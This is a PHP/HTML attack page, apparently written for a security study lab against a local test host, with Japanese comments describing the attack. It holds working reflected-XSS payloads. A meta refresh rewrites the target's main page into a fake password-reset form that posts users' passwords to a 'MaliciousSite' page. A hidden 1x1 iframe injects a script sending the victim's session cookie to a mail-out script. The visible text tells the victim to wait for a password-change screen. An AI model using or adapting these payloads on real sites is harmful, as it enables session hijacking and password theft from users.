<?php


?>

<html>
	<head>

		<!-- 
			3秒後に攻撃対象サイトのメインページに遷移します。 
			その際にXSS脆弱性を利用して、メインページをパスワード再設定画面に改ざんします。

			また、iframe内では攻撃対象サイトのメインページのXSS脆弱性を利用してセッションIDを取得し、
			それを攻撃者にメールで通知します。
		-->

		<meta http-equiv="refresh" content="3;URL=http://192.168.121.128/SecurityStudy/main.php?keyword=<form action='http://192.168.121.128/MaliciousSite/complete.html' method='POST'><div class='input-group input-group-lg'><span class='input-group-addon'><i class='fa fa-user'><\/i><\/span><input type='text' name='id' class='form-control' placeholder='Input OLD-Password'><\/div><div class='input-group input-group-lg'><span class='input-group-addon'><i class='fa fa-user'><\/i><\/span><input type='text' name='password' class='form-control' placeholder='Input NEW-Password'><\/div><button type='submit' id='submit_new_password' name='submit_new_password' value='submit_new_password' class='float'>Reset<\/button><\/form><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><\/div><\/body><\/html><!--">

<!--
<div class="input-group input-group-lg"><span class="input-group-addon"><i class="fa fa-user"><\/i><\/span><input type="text" name="id" class="form-control" placeholder="User-ID or email"><\/div><div class="input-group input-group-lg"><span class="input-group-addon"><i class="fa fa-user"><\/i><\/span><input type="text" name="password" class="form-control" placeholder="Password"><\/div>

<div class="input-group input-group-lg"><span class="input-group-addon"><i class="fa fa-user"><\/i><\/span><input type="text" name="id" class="form-control" placeholder="User-ID or email"><\/div><div class="input-group input-group-lg"><span class="input-group-addon"><i class="fa fa-user"><\/i><\/span><input type="text" name="password" class="form-control" placeholder="Password"><\/div>
-->

	</head>

	<body>
		パスワード変更画面に遷移しています。そのままおまちください。		

		<!-- scriptタグをhome.php側で書出し 
		<iframe src="http://192.168.121.128/home.php?keyword=window.location='http://192.168.121.128/crackcode/sendmail.php?sid='%2Bdocument.cookie;">
		-->
		<!-- scriptタグをこちら側で書出し -->		
		<iframe width="1" height="1" 
			src="http://192.168.121.128/SecurityStudy/main.php?keyword=<script>window.location='http://192.168.121.128/MaliciousSite/sendCollectedInfoMail.php?sid='%2Bdocument.cookie;<\/script>">
		  <p>Your browser does not support iframes.</p>
		</iframe>
	</body>
</html>

